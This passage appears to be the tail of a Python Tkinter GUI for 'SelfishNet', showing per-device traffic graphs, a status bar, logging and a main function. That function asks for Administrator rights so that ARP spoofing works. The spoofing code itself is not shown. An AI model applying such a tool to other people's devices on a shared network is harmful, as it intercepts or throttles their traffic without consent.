            tx, rx = self.app.get_device_traffic_rate(mac)
            tx_data.append(tx)
            rx_data.append(rx)
            if len(tx_data) > max_points:
                tx_data.pop(0)
                rx_data.pop(0)
            ax.clear()
            ax.plot(tx_data, label="Upload (TX)", color=GREEN, linewidth=2)
            ax.plot(rx_data, label="Download (RX)", color=ACCENT, linewidth=2)
            ax.legend(loc="upper left", facecolor=ROW_BG, labelcolor=TXT)
            ax.set_ylim(bottom=0)
            ax.set_xlabel("Time (samples)", color=TXT2)
            ax.set_ylabel("KB/s", color=TXT2)
            ax.tick_params(colors=TXT2)
            for spine in ax.spines.values():
                spine.set_color(TXT2)
            canvas.draw()
            self.graph_window.after(1000, update_graph)
        
        update_graph()
    
    def refresh_status_bar(self):
        try:
            io = psutil.net_io_counters()
            self.status_net.config(text=f"↑ {io.bytes_sent/1_048_576:.1f} MB  ↓ {io.bytes_recv/1_048_576:.1f} MB")
        except:
            pass
        self.root.after(3000, self.refresh_status_bar)
    
    def set_status(self, msg):
        self.status_lbl.config(text=msg)
    
    def _on_log(self, msg, level):
        def _insert():
            self.log_text.config(state="normal")
            ts = datetime.now().strftime("[%H:%M:%S] ")
            self.log_text.insert(tk.END, ts, "time")
            tag = level
            self.log_text.insert(tk.END, msg + "\n", tag)
            self.log_text.see(tk.END)
            self.log_text.config(state="disabled")
        self.root.after(0, _insert)

# ----------------------------------------------------------------------
#  MAIN
# ----------------------------------------------------------------------
def main():
    if os.name == 'nt' and not ctypes.windll.shell32.IsUserAnAdmin():
        messagebox.showwarning("Admin Required", "Please run as Administrator for ARP spoofing to work.")
    root = tk.Tk()
    app = SelfishNetGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()